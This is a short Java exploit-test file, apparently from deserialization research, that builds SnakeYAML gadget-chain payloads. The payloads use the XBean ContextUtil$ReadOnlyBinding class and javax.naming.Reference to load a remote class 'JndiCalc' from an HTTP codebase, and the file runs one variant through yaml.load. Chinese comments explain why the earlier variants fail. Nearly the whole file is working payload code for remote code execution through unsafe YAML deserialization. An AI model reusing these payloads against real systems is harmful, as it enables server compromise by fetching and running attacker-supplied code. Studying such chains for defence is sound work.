package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// XBean 之手写 EXP 之路
public class XBeanTestEXP {
    public static void main(String[] args) {
        String payload = " !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding " +
                "[ \"foo\",!!javax.naming.Reference [\"foo\", \"JndiCalc\", \"http://localhost:7777/\"]]";

        // 无此构造函数
        String test1 = " !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding " +
                "[ \"foo\",!!javax.naming.Reference [\"foo\", \"JndiCalc\", \"http://localhost:7777/\"]]";


        // value 作用域为 final
        String test2 = " !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding " +
                " value: !!javax.naming.Reference [\"foo\", \"JndiCalc\", \"http://localhost:7777/\"]";

        String test3 = "!!javax.management.BadAttributeValueExpException " +
                "[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding " +
                "[value: !!javax.naming.Reference [\"value\", \"JndiCalc\", \"http://localhost:7777/\"]]]";


        Yaml yaml = new Yaml();
        yaml.load(test3);
    }
}
